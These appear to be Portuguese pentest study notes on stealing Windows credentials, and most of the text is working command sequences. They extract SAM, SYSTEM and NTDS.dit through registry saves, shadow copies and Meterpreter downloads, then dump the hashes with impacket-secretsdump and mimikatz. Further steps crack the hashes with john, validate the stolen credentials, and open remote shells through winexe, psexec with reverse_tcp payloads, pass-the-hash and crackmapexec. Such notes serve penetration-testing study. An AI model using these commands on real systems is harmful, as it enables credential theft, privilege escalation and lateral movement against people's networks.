##   Hashes e Senhas - Windows

Introdução: Hashes em Windows

**SAM - Security Account Manager (Windows)**

Armazena as contas de usuários

%SystemRoot%/system32/config/sam

**NTDS.DIT (Windows Server / Active Directory)**

Armazena dados do AD incluindo as contas de usuários

%SystemRoot%/ntds/ntds.dit

**SYSTEM**

Arquivo do sistema necessário para decriptar o SAM/NTDS.DIT

%SystemRoot%/system32/config/system

Obs: Os arquivos acima são protegidos quando estão em execução, ou seja você não consegue copia-los quando estiverem em uso.

**Possivel solução para acesso aos arquivos**

**LOCALMENTE**

Acesso fisico ao computador? Realizar boot com live cd e capturar os arquivos.

**REMOTAMENTE**

C:\Windows\repair (apanesa sistema antigos como XP/2003)

Salvar direo do registro do windows (Desde versões antigas a versões recentes)

Ex: reg save hklm\sam

Cópia somnbra do volume (Versões mais recentes)

Ex: vssadmin


**ATAQUE**

Obter os arquvios e usá-los para obter os hashes

Tentar descobrir os hashes obtidos

**OUTRAS TÈCNICAS**

Senhas em memória/cache - Utilizar técnicas para obter senhas em cache ou na memória do Sistema.

Pass The Hash - Técnica para utilizar um hash sem precisar quebrá-lo

Captura de hashes na rede

**Exemplo de Hashes no Windows**

**Usuário   ID    LM(LAN MANAGER)   -   NTLM(NT LAN MANAGER)**

Administrador:500:aa.......................ee:ae..........................:::

rafaela:1005:aa...........................ee == vazio (significa que não está usando LM então se torna mais fácil de quebrar.)

Obs: ID = 500 - Corresponde a uma conta de administrador.




## Obtendo hashes: Sistemas Antigos

`getuid` - Comando para saber qual o seu nivel de permissão.

C:\WINDOWS\system32\config  - Local onde ficam armazenados as senhas

C:\WINDOWS\repair - Backup das senhas

`download sam` -> comando para fazer download do sam 

`download system` -> comando para fazer download do system 

Obs: o comando download é utilizado dentro do meterpreter

samdump2 - Aplicação para  idenficar os hashs baixados.

Obtendo system e sam diretamente do reg do windows.

`shell`

`C:\> reg /?`

`C:\> reg save hklm\sam samOK`

`C:\> reg save hklm\system systemOK`

`C:\> exit`

`meterpreter> download samOK`

`meterpreter> download systemOK`

`root@kali:/home/# samdump2 systemOK samOK`

Obs: baixar os arquivos direto do reg você baixa o arquvivo mais atualizado.

Outra aplicação para extrair as hashs

`impacket-secretsdump -sam samOK -system -systemOK LOCAL`




## Obtendo hashes: Sistemas Modernos

Salvando registro sam na area de trabalho do windows

- Execute o cmd como administrador
- reg save hklm\sam sam10
- reg save hklm\system system10

Exploit para ByPass em UAC (User Local Acont)

*Obs: Para utilizar este exlploit voce dever ja ter uma sessão aberta com o alvo.*

- search uac
- exploit(windows/local/ask)
- Payload options (windows/meterpreter/reverse_tcp):

*Obs: Para esse exploit ter sucesso tambem é preciso que o usuario da maquina alvo clique em sim na janela que irar abrir no alvo.*




## Obtendo hashes: Servidores AD

`C:\> cd windows`

`C:\Windows> cd ntds`

`C:\Windows\NTDS>dir`

ntds.dit --> Arquivo que possui as credenciais do Active Director, so que o mesmo não pode ser acesso de forma direta, então sera necessario fazer os proximos passos para obtermos as informações contidas no arquivo.

vssadmin - utilitario para criar uma copia sombra dos volumes que tem no windows.

`C:\>vssadmin list volumes`

`C:\>vssadmin create shadow /forc=c`

`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\ntds\ntds.dit c:\ntds.dit`

`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\system32\config\system c:\system12`

`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\system32\config\sam c:\sam12`

`meterpreter > download sam12`

`meterpreter > download system12`

`meterpreter > download ntds.dit`

`impacket-secretdump -sam sam12 -system system12 LOCAL`

`impacket-secretdump -ntds ntds.dit -system system12 LOCAL`

**Descobrindo hashes **

`john --fotmat=lm hash.txt`

Obtendo hashes e senhas em cache

**FGDUMP**

fgdump.exe --> Permite conseguir acessar informações que estão na cache, credenciais. 

type arquivo.pwdump

type arquivo.cachedump

**WCE**

wce-universal.exe --> Ler informações de cache e exibe credenciais em texto claro.

wce-universal.exe -w

meterpreter > hashdump

**MIMIKATZ**

meterpreter > load mimikatz

meterpreter > wdigest

meterpreter > mimikatz_command -f sekurlsa::wdigest -a full

meterpreter > mimikatz_command -f sekurlsa::serchPasswords

meterpreter > mimikatz_command -f sekurlsa::logonPasswords




## Validando as credenciais obtidas

**SMBCLIENT**

`smbclient -L \\x.x.x.x -U usuario`

**RDP**

`xfreerdp /u:usuario /p:password /v:x.x.x.x`





## Obtendo hashes remotamente

`impacket-secretsdum usuario:password@x.x.x.x`




## Obtendo shell no host

**WINEXE**

`winexe`

`winexe -U usuario%password //x.x.x.x cmd.exe`

**PSEXEC**

`msf5 exploit(windows/smb/psexec)`

`set SMBDomain ...`

`set SMBPass ...`

`set SMBUser ...`

`Payload Options (windows/x64/meterpreter/reverse_tcp)`




## Pass the Hash

**PTH-WINEXE**

*Obs: Acessando maquina alvo sem quebrar hashe.*

`pth-winexe -U usuario%...HASHE... //x.x.x.x cmd.exe`

**PSEXEC**

`msf5 exploit(windows/smb/psexec)`

`set SMBDomain ...`

`set SMBPass ...HASHE...`

`set SMBUser ...`

`Payload Options (windows/x64/meterpreter/reverse_tcp)`




## Swiss Army Knife para Pentest

**CRACKMAPEXEC** - Canivete suiço.

`apt install crackmapexec`

Listando hosts na rede que possuem serviços samba.

`crackmapexec smb 192.168.0.0/24` 

Testando credenciais em servidores que possuem smb e o usuario enviado tem acesso.

`crackmapexec smb 192.168.0.0/24 -u usuario -p 'password'`

Executando comando de forma direta

`crackmapexec smb 192.168.0.0/24 -u usuario -p 'password' -x 'whoami'`




## Ataque: NBT-NS / LLMNR







